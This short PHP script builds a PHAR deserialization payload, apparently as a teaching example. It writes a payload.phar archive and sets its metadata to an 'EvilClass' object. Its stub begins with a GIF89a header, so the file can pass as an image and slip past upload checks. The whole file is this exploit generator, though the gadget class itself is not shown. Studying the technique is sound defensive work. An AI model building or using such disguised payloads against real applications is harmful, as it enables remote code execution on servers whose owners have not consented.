<?php
require '../vendor/autoload.php';

$fileName = '../phar/payload.phar';

@unlink($fileName);

$phar = new Phar($fileName);

$phar->buildFromDirectory('../phar/', '/\.php$/');
$phar->setMetadata(new \Examples\Example5\EvilClass());
$phar->setStub('GIF89a<?php

function __autoload($name) {
    require_once str_replace(\'\\\\\',DIRECTORY_SEPARATOR, $name) . \'.php\';
} __HALT_COMPILER();');
